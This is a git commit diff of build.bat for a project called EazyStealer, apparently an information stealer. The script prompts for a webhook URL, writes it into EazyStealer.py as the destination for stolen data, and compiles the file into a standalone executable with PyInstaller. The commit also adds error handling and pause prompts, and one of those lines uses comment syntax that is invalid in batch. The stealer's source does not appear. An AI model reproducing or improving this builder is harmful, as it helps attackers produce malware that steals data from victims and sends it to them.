557522be1cd6e68eda80151dc03bbc7b7e02cad6
Sife <140217482+LETMETYPEAUSERNAME@users.noreply.github.com>
2024-11-27 14:33:50 +1000

    Update build.bat

--- build.bat
+++ build.bat
@@ -2,15 +2,29 @@
 setlocal
 
 set /p webhook_url=Please enter your webhook URL: 
+pause  # Pause to check if the input is correct
 
 if "%webhook_url%"=="" (
     echo No webhook URL provided. Exiting...
+    pause
     exit /b
 )
-powershell -Command (gc EazyStealer.py) -replace 'YOUR_WEBHOOK_URL_HERE', '%webhook_url%' | Out-File EazyStealer.py -Encoding utf8
 
+echo Updating EazyStealer.py...
+powershell -Command "(gc EazyStealer.py) -replace 'YOUR_WEBHOOK_URL_HERE', '%webhook_url%' | Out-File EazyStealer.py -Encoding utf8"
+if ERRORLEVEL 1 (
+    echo Failed to update EazyStealer.py. Exiting...
+    pause
+    exit /b
+)
+
+echo Building executable...
 python -m PyInstaller --onefile --hidden-import=encodings EazyStealer.py
-
+if ERRORLEVEL 1 (
+    echo PyInstaller failed. Exiting...
+    pause
+    exit /b
+)
 
 del EazyStealer.spec
 rmdir /s /q build
